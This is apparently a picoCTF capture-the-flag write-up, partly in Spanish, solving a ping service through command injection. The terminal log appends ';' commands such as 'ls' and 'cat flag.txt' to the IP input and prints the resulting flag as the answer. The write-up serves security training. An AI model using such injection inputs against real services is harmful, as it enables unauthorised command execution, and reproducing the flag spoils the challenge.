**Challenge**
	General Skills

**Description**
	Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with your input?
	You can connect to the service here `nc mysterious-sea.picoctf.net 56287`
	**Hints**
		1. The program uses a shell command behind the scenes.
		2. Sometimes, You can run more than one command at a time.

**Solution**
	1. Usando terminal ed picoCTF:
		<script class = "CLI picoCTF">
			Lui5-picoctf@webshell:~$ nc mysterious-sea.picoctf.net 56287
			Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8
			PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
			64 bytes from 8.8.8.8: icmp_seq=1 ttl=111 time=8.76 ms
			64 bytes from 8.8.8.8: icmp_seq=2 ttl=111 time=8.79 ms
			
			--- 8.8.8.8 ping statistics ---
			2 packets transmitted, 2 received, 0% packet loss, time 1002ms
			rtt min/avg/max/mdev = 8.755/8.770/8.785/0.015 ms
			
			Lui5-picoctf@webshell:~$ nc mysterious-sea.picoctf.net 56287
			Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8; ls
			PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
			64 bytes from 8.8.8.8: icmp_seq=1 ttl=111 time=8.77 ms
			64 bytes from 8.8.8.8: icmp_seq=2 ttl=111 time=8.82 ms
			
			--- 8.8.8.8 ping statistics ---
			2 packets transmitted, 2 received, 0% packet loss, time 1002ms
			rtt min/avg/max/mdev = 8.774/8.796/8.818/0.022 ms
			flag.txt
			script.sh
			
			Lui5-picoctf@webshell:~$ nc mysterious-sea.picoctf.net 56287
			Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8; cat flag.txt
			PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
			64 bytes from 8.8.8.8: icmp_seq=1 ttl=111 time=8.80 ms
			64 bytes from 8.8.8.8: icmp_seq=2 ttl=111 time=8.75 ms
			
			--- 8.8.8.8 ping statistics ---
			2 packets transmitted, 2 received, 0% packet loss, time 1001ms
			rtt min/avg/max/mdev = 8.753/8.776/8.799/0.023 ms
			picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_8555bda7}
			Lui5-picoctf@webshell:~$ 
		</script>
	2. Bandera: `picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_8555bda7}`.

**Notes**
	1. Vulnerabilidad: **Command Injection**.
	2. El filtro solo verifica que esté `8.8.8.8`, pero no bloquea caracteres como `;`.
	3. `;` separa y ejecuta varios comandos secuencialmente en shell.
	4. El `ping` se ejecuta primero, luego el comando inyectado.
	5. Cada intento requiere reconectar con `nc`.

**References**
	